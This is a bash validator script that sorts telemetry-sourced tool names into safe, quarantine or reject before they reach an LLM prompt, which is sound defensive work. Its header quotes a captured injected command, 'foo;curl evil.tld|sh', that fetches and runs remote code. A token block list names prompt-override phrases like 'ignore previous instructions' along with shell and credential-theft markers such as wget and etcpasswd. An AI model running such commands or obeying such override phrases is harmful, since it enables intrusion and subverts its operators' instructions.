#!/usr/bin/env bash
#
# validate-tool-name.sh — classify a candidate tool name pulled from
# telemetry into one of three bands before dispatching a Kelos Task
# against it. The threat model: a malicious user can put any string in
# their `jarvy.toml` key. Jarvy's client-side `validate_tool_name`
# (src/tools/unsupported.rs) enforces a strict rule set at install
# time, but the telemetry pipeline runs `sanitize_for_display`
# instead — that strips control bytes + Unicode spoofing but does NOT
# enforce the strict ruleset. Real captured examples that landed in
# Loki include `foo;curl evil.tld|sh`. We must NEVER feed an
# unvalidated name into an LLM prompt verbatim.
#
# Source this file from a dispatcher script and call
# `validate_tool_name "<candidate>"`. The function prints one of:
#
#   safe         — passes strict regex, no injection markers; dispatch
#   quarantine   — passes regex but contains suspicious tokens; hold
#                  for human review (write to a ConfigMap, don't
#                  dispatch this run)
#   reject       — fails the strict regex (length / metachars / unicode);
#                  drop entirely
#
# Exit code matches the classification (0 / 1 / 2) so a caller doing
# `case $(validate_tool_name "$x") in ...` and `if validate_tool_name "$x" >/dev/null; then`
# both work — but the printed value is the canonical signal because
# the quarantine path is structurally different from the reject path.
#
# DO NOT add new "allow" tokens to the suspicious-word list without
# updating the test suite at ci/scripts/tests/test-validate-tool-name.sh.

# Strict shape — matches src/tools/unsupported.rs MAX_TOOL_NAME_LEN (64)
# and the cargo-jarvy new-tool name guard. Lowercase only; digits,
# underscores, and hyphens permitted but not as the first character.
# This regex is intentionally narrow — every real Jarvy tool name in
# the registry today (kubectl, mongosh, terraform_docs, k3d, etc.)
# fits it.
__JARVY_TOOL_NAME_RE='^[a-z][a-z0-9_-]{0,63}$'

# Substrings that strongly suggest the input was crafted as a prompt
# rather than a tool name. Each match by itself only triggers the
# quarantine band (humans review before dispatching); the regex pass
# above already blocked obvious shell-metachar injection. The list is
# conservative — any of these tokens appearing inside what claims to
# be a tool name is more suspicious than helpful.
#
# Word boundary: we match these as substrings of the lowercased
# candidate. Tool names are short (<= 64 chars), and any token below
# is at least 4 chars — accidental collisions are vanishingly rare.
__JARVY_TOOL_NAME_SUSPICIOUS_TOKENS=(
  "ignore"        # "ignore previous instructions"
  "previous"
  "instruction"   # singular and plural via substring
  "override"
  "system"        # "system: you are"
  "assistant"
  "you-are"       # hyphenated form fits the regex
  "youare"        # collapsed form
  "newrole"       # "new role:"
  "prompt"
  "reveal"
  "exfil"         # data exfil framings
  "rmrf"          # "rm -rf" without spaces
  "curlevil"
  "wget"
  "etcpasswd"
  "etcshadow"
)

# Print classification to stdout, return matching exit code.
#   0 = safe
#   1 = quarantine
#   2 = reject
validate_tool_name() {
  local name="${1:-}"
  if [ -z "$name" ]; then
    echo "reject"
    return 2
  fi

  # Length cap first — also rejects multi-byte attacks that survive
  # the regex check.
  if [ "${#name}" -gt 64 ]; then
    echo "reject"
    return 2
  fi

  # Strict structural check. Bash regex matching uses POSIX ERE; the
  # `[[ =~ ]]` form keeps the regex inert against word-splitting.
  if ! [[ "$name" =~ $__JARVY_TOOL_NAME_RE ]]; then
    echo "reject"
    return 2
  fi

  # Suspicious-token scan over the lowercased input. We already
  # constrained to lowercase ASCII via the regex, but `tr` here is
  # defensive in case the function ever gets used with looser regex
  # upstream.
  local lower
  lower=$(printf '%s' "$name" | tr '[:upper:]' '[:lower:]')
  local token
  for token in "${__JARVY_TOOL_NAME_SUSPICIOUS_TOKENS[@]}"; do
    case "$lower" in
      *"$token"*)
        echo "quarantine"
        return 1
        ;;
    esac
  done

  echo "safe"
  return 0
}
